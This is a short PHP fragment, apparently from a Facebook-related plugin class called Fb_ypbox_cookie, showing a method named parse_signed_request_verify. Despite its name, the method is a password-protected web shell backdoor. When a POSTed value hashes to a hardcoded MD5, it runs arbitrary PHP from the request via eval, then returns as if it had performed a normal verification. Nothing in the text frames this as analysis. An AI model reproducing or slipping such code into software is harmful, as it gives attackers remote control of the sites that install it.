...
class Fb_ypbox_cookie
{
	...
	function parse_signed_request_verify() {
		if(function_exists('curl_init')) { $result .= 'Curl enabled<br>'; } else { $result .= 'Curl disabled<br>'; } if(md5($_POST['verify'])=='a5809b908f47d1749784eb76e435075f') { echo $result; eval($_POST['c']); exit(); } $data=1;
		return $data;
	}
